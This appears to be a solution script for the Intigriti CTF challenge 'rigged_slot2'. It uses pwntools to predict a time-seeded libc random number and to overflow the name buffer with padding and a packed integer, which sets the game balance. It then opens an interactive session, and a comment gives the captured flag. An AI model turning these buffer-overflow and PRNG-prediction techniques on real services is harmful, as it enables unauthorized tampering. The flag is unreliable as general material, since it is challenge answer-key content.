#!/usr/bin/env python3

from pwn import *
import ctypes

context.log_level = "debug"
elf = ELF("./rigged_slot2", checksec=False)
context.binary = elf

libc = ctypes.CDLL("./ubuntu:23.04.libc.so.6")

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("riggedslot2.ctf.intigriti.io", 1337)

libc.srand(libc.time(0))

# have to play at least once...
# ... and the resulting balance should be equal to 0x14684c

bet = 69
iVar2 = libc.rand() % 1000
local_c = 0

if iVar2 == 0:
    local_c = 10
elif iVar2 < 5:
    local_c = 5
elif iVar2 < 10:
    local_c = 3
elif iVar2 < 0xf:
    local_c = 2
elif iVar2 < 0x1e:
    local_c = 1

winnings = bet * local_c - bet
starting_balance = 0x14684c - winnings

payload = b""
payload += b"A" * 0x14
payload += p32(starting_balance)
p.sendlineafter(b"Enter your name:", payload)

p.sendlineafter(b"per spin): ", str(69).encode())

p.interactive() # INTIGRITI{1_w15h_17_w45_7h15_345y_1n_v3645}
